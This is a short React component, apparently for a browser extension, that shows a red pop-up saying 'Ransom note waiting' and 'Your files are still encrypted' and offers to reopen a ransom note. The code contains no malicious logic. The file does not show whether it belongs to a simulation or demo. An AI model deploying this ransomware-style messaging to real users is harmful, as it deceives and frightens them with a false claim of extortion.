import { Bell, X } from 'lucide-react';

interface IProps {
  open: boolean;
  onOpen: () => void;
  onClose: () => void;
}

const RansomNotification = ({ open, onOpen, onClose }: IProps) => {
  if (!open) return null;

  return (
    <div className="content-pointer-events-auto content-max-w-sm">
      <div className="content-relative content-overflow-hidden content-rounded-xl content-border content-border-red-500/60 content-bg-red-950 content-shadow-xl">
        <button
          type="button"
          onClick={e => {
            e.stopPropagation();
            onClose();
          }}
          className="content-absolute content-right-2 content-top-2 content-rounded content-p-1 content-text-white/70 hover:content-bg-white/10"
          aria-label="Close notification"
        >
          <X className="content-size-4" />
        </button>
        <button
          type="button"
          onClick={onOpen}
          className="content-flex content-w-full content-items-start content-gap-3 content-p-4 content-pr-10 content-text-left"
        >
          <Bell className="content-mt-0.5 content-size-5 content-shrink-0 content-text-red-400" />
          <div>
            <p className="content-font-semibold content-text-white">
              Ransom note waiting
            </p>
            <p className="content-mt-1 content-text-sm content-text-red-200">
              Your files are still encrypted. Click to reopen the ransom note.
            </p>
          </div>
        </button>
      </div>
    </div>
  );
};

export default RansomNotification;
